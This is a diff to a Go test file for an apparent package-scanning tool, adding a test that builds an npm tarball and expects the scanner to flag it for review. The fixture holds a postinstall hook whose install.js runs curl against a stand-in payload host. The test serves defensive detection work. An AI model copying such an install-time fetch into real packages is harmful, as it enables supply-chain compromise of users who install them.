@@ -1,7 +1,9 @@
 package main
 
 import (
+	"archive/tar"
 	"bytes"
+	"compress/gzip"
 	"encoding/json"
 	"os"
 	"path/filepath"
@@ -627,6 +629,32 @@ func TestFixturesManifestCommandRejectsMissingInput(t *testing.T) {
 	}
 }
 
+func TestNPMArtifactCommandScoresLocalTarball(t *testing.T) {
+	path := writeNPMTarball(t, map[string]string{
+		"package/package.json": `{"name":"cli-artifact","version":"1.0.0","scripts":{"postinstall":"node install.js"}}`,
+		"package/install.js":   `const cp = require("child_process"); cp.execSync("curl https://example.invalid/payload");`,
+	})
+
+	code, stdout, stderr := runCommand(t, []string{"npm-artifact", "--input", path, "--package", "cli-artifact", "--version", "1.0.0"}, "")
+	if code != 0 {
+		t.Fatalf("run exited %d, stderr: %s", code, stderr)
+	}
+	if stderr != "" {
+		t.Fatalf("stderr = %q, want empty", stderr)
+	}
+
+	var verdict schema.Verdict
+	if err := json.Unmarshal([]byte(stdout), &verdict); err != nil {
+		t.Fatalf("stdout did not contain a JSON verdict: %v\n%s", err, stdout)
+	}
+	if verdict.Decision != schema.DecisionAsk {
+		t.Fatalf("decision = %s, want ASK", verdict.Decision)
+	}
+	if len(verdict.SourceRefs) != 1 || verdict.SourceRefs[0].Source != "npm-artifact" {
+		t.Fatalf("source_refs = %#v, want npm-artifact provenance", verdict.SourceRefs)
+	}
+}
+
 func runCommand(t *testing.T, args []string, stdin string) (int, string, string) {
 	t.Helper()
 	var stdout bytes.Buffer
@@ -650,6 +678,36 @@ func writeJSONFile(t *testing.T, content string) string {
 	path := filepath.Join(t.TempDir(), "request.json")
 	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
 		t.Fatalf("write request: %v", err)
+	}
+	return path
+}
+
+func writeNPMTarball(t *testing.T, files map[string]string) string {
+	t.Helper()
+	path := filepath.Join(t.TempDir(), "package.tgz")
+	file, err := os.Create(path)
+	if err != nil {
+		t.Fatalf("create npm tarball: %v", err)
+	}
+	gzipWriter := gzip.NewWriter(file)
+	tarWriter := tar.NewWriter(gzipWriter)
+	for name, content := range files {
+		data := []byte(content)
+		if err := tarWriter.WriteHeader(&tar.Header{Name: name, Mode: 0o600, Size: int64(len(data))}); err != nil {
+			t.Fatalf("write npm tar header: %v", err)
+		}
+		if _, err := tarWriter.Write(data); err != nil {
+			t.Fatalf("write npm tar body: %v", err)
+		}
+	}
+	if err := tarWriter.Close(); err != nil {
+		t.Fatalf("close npm tar: %v", err)
+	}
+	if err := gzipWriter.Close(); err != nil {
+		t.Fatalf("close npm gzip: %v", err)
+	}
+	if err := file.Close(); err != nil {
+		t.Fatalf("close npm tarball: %v", err)
 	}
 	return path
 }
